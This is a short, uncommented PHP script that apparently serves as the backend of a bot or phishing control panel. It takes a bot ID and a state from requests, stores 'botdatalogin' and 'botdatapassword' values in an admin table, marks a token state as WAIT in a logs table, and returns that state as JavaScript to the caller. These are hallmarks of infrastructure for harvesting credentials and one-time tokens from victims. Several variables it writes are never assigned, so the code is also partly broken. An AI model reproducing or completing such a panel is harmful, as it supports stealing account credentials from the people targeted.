<?php

require_once 'config/config.php';

 $state = '';
 $data = 'var return_msg = "NULL";';

if(!empty($_GET['state'])){$state = $_GET['state'];};
if(!empty($_GET['botid'])){$botid = $_GET['botid'];};

if(!empty($_POST['state'])){$state = $_POST['state'];};
if(!empty($_POST['botid'])){$botid = $_POST['botid'];};


$db = getDbInstance();

$data_to_db['tokenstate'] = 'WAIT';

$db->where('botid', $botid);

$db->update ('logs',  $data_to_db);



//data to db
    if($state == 'login')
   {
    $db = getDbInstance();
    $data_to_db_botid['botid'] = $botid;
    $data_to_db_botdatalogin['botdatalogin'] = $botdatalogin;
    $data_to_db_botdatapassword['botdatapassword'] = $botdatapassword;
    $data_to_db_botstate['botstate'] = $botstate;
	$db->where('id', '1');
	$db->update('admin_accounts', $data_to_db_botid);
	$db->update('admin_accounts', $data_to_db_botdatalogin);
	$db->update('admin_accounts', $data_to_db_botdatapassword);
	$db->update('admin_accounts', $data_to_db_botstate );
   }


//data from bd
     if($state == 'workstate')
   {

     $db = getDbInstance();
     $db->where('botid', $botid);

     $botstate = $db->getValue ("logs", 'tokenstate');

     $data = 'var jsess_msg = "'.$botstate.'";';

     echo $data;

   }


?>
